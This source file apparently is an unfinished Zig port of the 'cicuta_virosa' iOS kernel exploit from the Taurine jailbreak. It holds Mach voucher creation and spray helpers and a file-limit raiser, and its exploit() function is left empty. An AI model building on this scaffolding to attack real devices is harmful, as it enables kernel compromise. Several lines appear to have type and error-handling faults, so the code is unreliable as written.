// Port of Taurine's version of cicuta_virosa.

const c = @cImport({
    @cInclude("mach/mach.h");
    @cInclude("sched.h");
});

const utils = @import("../utils.zig");

const std = @import("std");

// voucher_utils.h

const USER_DATA_ELEMENT_SIZEOF = 32;
const DATA_VOUCHER_CONTENT_SIZE = 168 - USER_DATA_ELEMENT_SIZEOF;

// voucher_utils.c

var host: c.host_name_port_t = c.MACH_PORT_NULL;

pub const VoucherError = error {
    CreateVoucherFailed,
    DestroyVoucherFailed,
    RecipeAllocateFailed,
    RecipeFreeFailed,
};

pub fn createVoucher(recipe: c.mach_voucher_attr_recipe_t, voucher: *c.ipc_voucher_t) VoucherError!void {
    if (host == c.MACH_PORT_NULL) {
        host = c.mach_host_self();
    }

    var err = c.host_create_mach_voucher(
        host,
        @ptrCast(c.mach_voucher_attr_raw_recipe_array_t, recipe),
        @sizeOf(recipe.*) + recipe.content_size,
        voucher,
    );
    if (err) {
        utils.errorf("failed to create voucher: 0x{x}.", .{err});
        return VoucherError.CreateVoucherFailed;
    }
}

pub fn createUserDataVoucherFast(id: u64, voucher: *c.ipc_voucher_t) VoucherError!void {
    var recipe = createRecipeForUserDataVoucher(id);
    try createVoucher(&recipe, voucher);
    utils.alloc.free(recipe) catch return VoucherError.RecipeFreeFailed;
}

pub fn createRecipeForUserDataVoucher(id: u64) VoucherError!c.mach_voucher_attr_recipe_data_t {
    var recipe = @ptrCast(
        c.mach_voucher_attr_recipe_t,
        utils.alloc.alloc(
            u8,
            @sizeOf(c.mach_voucher_attr_recipe_data_t) + DATA_VOUCHER_CONTENT_SIZE,
        ) catch return VoucherError.RecipeAllocateFailed,
    );
    std.mem.set(u8, @ptrCast([]u8, recipe), 0);
    recipe.key = c.MACH_VOUCHER_ATTR_KEY_USER_DATA;
    recipe.command = c.MACH_VOUCHER_ATTR_USER_DATA_STORE;
    recipe.content_size = DATA_VOUCHER_CONTENT_SIZE;
    var content: *u64 = &recipe.content;
    content[0] = 0x4141414141414141;
    content[1] = id;
    return recipe.*;
}

pub fn destroyVoucher(voucher: c.mach_port_t) VoucherError!void {
    var err = c.mach_port_destroy(c.mach_task_self(), voucher);

    if (err) {
        utils.errorf("failed to destroy voucher: 0x{x}.", .{err});
        return VoucherError.DestroyVoucherFailed;
    }
}

// descriptors_utils.c

pub fn increaseLimits(limit: u32) !void {
    var lim = try std.os.getrlimit(std.os.rlimit_resource.NOFILE);
    lim.cur = @intCast(std.os.rlim_t, limit);
    try std.os.setrlimit(std.os.rlimit_resource.NOFILE, &lim);
}

// cicuta_virosa.c

pub fn exploit() !void {

}
